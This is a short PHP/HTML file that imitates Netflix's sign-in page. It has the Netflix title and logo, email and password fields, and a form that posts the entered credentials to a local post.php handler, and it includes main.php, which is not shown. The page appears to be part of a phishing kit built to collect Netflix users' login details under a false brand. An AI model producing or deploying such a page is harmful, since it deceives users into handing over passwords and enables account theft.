<?php 
require 'main.php';
?><!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflix.css">
    <title>Netflix</title>
</head>
<body >
     
<header>
   <div class="logo">
           <img src="res/img/Logo.png">
       </header>  </div>


<main>
 
<div class="continer">

<div class="title">
<label > Sign In </label> 
</div>
<br>
<form action="post.php" method="post">
<div class="col">
    <input type="text"  name="user" placeholder="Email or mobile number" required autofocus>
</div>
<div class="col">
    <input type="password"  name="pass" placeholder="Password" required >
</div>
<div class="but">
  <button type="submit">Sign In</button>
</div>
 
<div class="ou">
    <label >OR</label>
</div>

<div class="butt">
    <button>Use a Sign-In Code </button>

</div>

<div class="pas">
Forgot password?
</div>

<div class="chek">
    <input type="checkbox" >
    <label >Remember me</label>
</div>





</form>
</div>
</main>


</body>
</html>